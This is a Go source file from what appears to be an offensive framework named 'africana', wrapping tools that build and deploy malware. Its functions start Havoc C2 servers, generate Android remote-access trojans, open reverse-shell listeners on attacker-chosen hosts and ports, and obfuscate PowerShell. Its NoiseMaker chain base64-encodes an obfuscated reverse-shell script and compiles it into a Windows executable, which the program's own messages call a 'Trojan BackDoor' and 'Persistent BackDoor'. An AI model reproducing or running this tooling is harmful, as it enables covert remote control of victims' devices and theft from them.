package butchers

import (
    "os"
    "fmt"
    "log"
    "utils"
    "bufio"
    "bytes"
    "banners"
    "strings"
    "bcolors"
    "io/ioutil"
    "subprocess"
    "unicode/utf16"
    "encoding/base64"
)

var(
    userInput   string
    userTarget  string
    userLhost   string
    userLPort   string
    userHport   string
    userMalware string
    userScript  string
    userOutput  string
    reader = bufio.NewReader(os.Stdin)
)

func Havoc() {
    subprocess.Popen(`havoc client & havoc server -d -v`)
    fmt.Println()
}

func Shellz() {
    subprocess.Popen(`cd /root/.africana/africana-base/shells/; bash shells`)
}

func MeterPeter() {
    subprocess.Popen(`cd /root/.africana/africana-base/meterpeter/; pwsh meterpeter.ps1`)
}

func TearDroid() {
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "africana.apk" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userMalware, _ := reader.ReadString('\n')
    userMalware = strings.TrimSpace(userMalware)
    if userMalware == "" {
        userMalware = "africana.apk"
    }
    subprocess.Popen(`cd /root/.africana/africana-base/teardroid/; python3 Teardroid.py -b %s`, userMalware)
}

func Chameleon() {
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userScript)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userOutput, _ := reader.ReadString('\n')
    userOutput = strings.TrimSpace(userOutput)
    if userOutput == "" {
        userOutput = "/root/.africana/output/leviathan.txt"
    }
    subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; python3 chameleon.py -a %s -o %s`, userScript, userOutput)
}

func Gh0x0st() {
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userScript)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userOutput, _ := reader.ReadString('\n')
    userOutput = strings.TrimSpace(userOutput)
    if userOutput == "" {
        userOutput = "/root/.africana/output/levuathan.txt"
    }
    subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)
}

func BlackJack() {
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "use" + bcolors.ENDC + ": " + bcolors.BLUE + bcolors.ITALIC + "1. " + bcolors.YELLOW + "TCP " + bcolors.BLUE + "2. " + bcolors.YELLOW + "HTTPS " + bcolors.BLUE + "or " + bcolors.BLUE + "0. " + bcolors.PURPLE + "Go back" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userInput, _ := reader.ReadString('\n')
    userInput = strings.TrimSpace(userInput)
    if userInput == "" {
        userInput = "1"
    }
    switch userInput {
    case "0":
        return
    case "1":
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        utils.ClearScreen()
        banners.Banner()
        subprocess.Popen(`cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -q -i -n %s`, userLport)
    case "2":
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "HPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "3333" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userHport, _ := reader.ReadString('\n')
        userHport = strings.TrimSpace(userHport)
        if userHport == "" {
            userHport = "3333"
        }
        utils.ClearScreen()
        banners.Banner()
        subprocess.Popen(`cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -q -i -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -x %s -n %s`, userLport, userHport)
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
}

func PowerJoker() {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userLhost, _ := reader.ReadString('\n')
    userLhost = strings.TrimSpace(userLhost)
    if userLhost == "" {
        userLhost = userLhostIp
    }
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userLport, _ := reader.ReadString('\n')
    userLport = strings.TrimSpace(userLport)
    if userLport == "" {
        userLport = "9999"
    }
    subprocess.Popen(`cd /root/.africana/africana-base/joker/; python3 joker.py -l %s -p %s`, userLhost, userLport)
}

func AndroRat() {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    filePath := "/usr/bin/zipalign.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana`)
        subprocess.Popen(`apt-get install /root/.africana/africana-base/androrat/zipalign_8.1.0.deb --allow-downgrades -y`)
    }
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userLhost, _ := reader.ReadString('\n')
    userLhost = strings.TrimSpace(userLhost)
    if userLhost == "" {
        userLhost = userLhostIp
    }
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userLport, _ := reader.ReadString('\n')
    userLport = strings.TrimSpace(userLport)
    if userLport == "" {
        userLport = "9999"
    }
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output name " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "africana.apk" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userMalware, _ := reader.ReadString('\n')
    userMalware = strings.TrimSpace(userMalware)
    if userMalware == "" {
        userMalware = "africana.apk"
    }
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userOutput, _ := reader.ReadString('\n')
    userOutput = strings.TrimSpace(userOutput)
    if userOutput == "" {
        userOutput = "/root/.africana/output/"
    }
    subprocess.Popen(`cd /root/.africana/africana-base/androrat/; python3 androrat.py --build -i %s -p %s -o %s`, userLhost, userLport, userOutput + userMalware + ".apk")
    subprocess.Popen(`cd /root/.africana/africana-base/androrat/; python3 androrat.py --shell -i %s -p %s`, userLhost, userLport)
}

func NoiseMaker() {
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "use" + bcolors.ENDC + ": " + bcolors.BLUE + bcolors.ITALIC + "1. " + bcolors.YELLOW + "TCP " + bcolors.BLUE + "2. " + bcolors.YELLOW + "HTTPS " + bcolors.BLUE + "or " + bcolors.BLUE + "0. " + bcolors.PURPLE + "Go back" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userInput, _ := reader.ReadString('\n')
    userInput = strings.TrimSpace(userInput)
    if userInput == "" {
        userInput = "1"
    }
    switch userInput {
    case "0":
        return
    case "1":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
            os.Exit(1)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        subprocess.Popen(`cp -r /root/.africana/africana-base/africana-bines/noisemaker.ps1 /root/.africana/output/noisemaker.txt`)
        filesToReplacements := map[string]map[string]string{
            "/root/.africana/output/noisemaker.txt": {
            `*LHOST*`: userLhost,
            `*LPORT*`: userLport,
            },
        }
        fmt.Println()
        utils.Editors(filesToReplacements)
        userScript := `/root/.africana/output/noisemaker.txt`
        userOutput := `/root/.africana/output/noisemaker.ps1`
        subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)
    case "2":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
            os.Exit(1)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        subprocess.Popen(`cp -r /root/.africana/africana-base/africana-bines/noisemakers.ps1 /root/.africana/output/noisemaker.txt`)
        filesToReplacements := map[string]map[string]string{
            "/root/.africana/output/noisemaker.txt": {
            `*LHOST*`: userLhost,
            `*LPORT*`: userLport,
            },
        }
        fmt.Println()
        utils.Editors(filesToReplacements)
        userScript := `/root/.africana/output/noisemaker.txt`
        userOutput := `/root/.africana/output/noisemaker.ps1`
        subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
    NoiseCompiler()
}

func NoiseCompiler() {
    filePath := "/root/.africana/output/noisemaker.ps1"
    content, err := ioutil.ReadFile(filePath)
    if err != nil {
        fmt.Printf("Error reading file: %v\n", err)
        return
    }

    utf16Content := utf16.Encode([]rune(string(content)))
    buf := new(bytes.Buffer)
    for _, v := range utf16Content {
        buf.Write([]byte{byte(v), byte(v >> 8)})
    }

    encoded := base64.StdEncoding.EncodeToString(buf.Bytes())

    subprocess.Popen(`cp -r /root/.africana/africana-base/africana-bines/noisemaker.go /root/.africana/output/noisemaker.go`)
    filesToReplacements := map[string]map[string]string{
        "/root/.africana/output/noisemaker.go": {
        `NoiseMakers`: encoded,
        },
    }
    utils.Editors(filesToReplacements)
    fmt.Printf(bcolors.BLUE + "\nBase64 Encoded PS1 Script:" + bcolors.DARKGREEN + "\n%s" + bcolors.ENDC, encoded)
    fmt.Printf(bcolors.BLUE + "\n\nBuilding the Trojan BackDoor:\n" + bcolors.ENDC)
    subprocess.Popen(`GOOS=windows GOARCH=amd64 go build -o /root/.africana/output/noisemaker.exe /root/.africana/output/noisemaker.go`)
    NoiseBuilder()
}

func NoiseBuilder() {
    binaryFilePath := "/root/.africana/africana-base/africana-bines/Secur32.dll"
    exeFilePath := "/root/.africana/output/noisemaker.exe"

    binaryData, err := ioutil.ReadFile(binaryFilePath)
    if err != nil {
        log.Fatalf("Failed reading binary file: %s", err)
    }

    exeData, err := ioutil.ReadFile(exeFilePath)
    if err != nil {
        log.Fatalf("Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)
    encodedBinary := base64.StdEncoding.EncodeToString(binaryData)

    subprocess.Popen(`cp -r /root/.africana/africana-base/africana-bines/noisemakers.go /root/.africana/output/noisemakers.go`)
    filesToReplacements := map[string]map[string]string{
        "/root/.africana/output/noisemakers.go": {
        `noisemakers`: encodedExe,
        `noisemakerx`: encodedBinary,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf("Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf("Failed to set GOARCH environment variable: %s", err)
    }

    outputFilePath := "/root/.africana/output/noisemakers.go"
    executablePath := "/root/.africana/output/africana_backdoor.exe"
    buildCmd := "go build -x -v -o %s %s"

    formattedCmd := fmt.Sprintf(buildCmd, executablePath, outputFilePath)
    subprocess.Popen(formattedCmd)

    log.Printf(bcolors.BLUE + "\n\nPersisternt BackDoor: " + bcolors.DARKGREEN + "Saved at " + bcolors.RED + "%s", executablePath)
}
